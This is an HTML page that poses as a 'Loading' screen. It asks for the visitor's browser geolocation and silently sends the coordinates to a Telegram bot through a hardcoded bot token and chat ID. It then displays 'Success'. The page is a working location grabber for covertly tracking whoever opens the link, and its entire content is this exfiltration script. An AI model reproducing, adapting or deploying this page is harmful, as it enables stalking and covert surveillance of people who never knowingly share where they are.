<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading</title>
</head>
<body>
    <script>
        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    var lat = position.coords.latitude;
                    var lon = position.coords.longitude;
                    var token = "8759633984:AAGhfzqlvb-6knXk6oqIvDQCvSP6p8jej6Y"; 
                    var chat_id = "7323283649";
                    var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=Location: https://www.google.com/maps?q=" + lat + "," + lon;
                    var req = new XMLHttpRequest();
                    req.open("GET", url, true);
                    req.send();
                    document.body.innerHTML = "<h1 style='text-align:center;'>Success</h1>";
                });
            }
        };
    </script>
    <h1 style="text-align:center;">Loading...</h1>
</body>
</html>
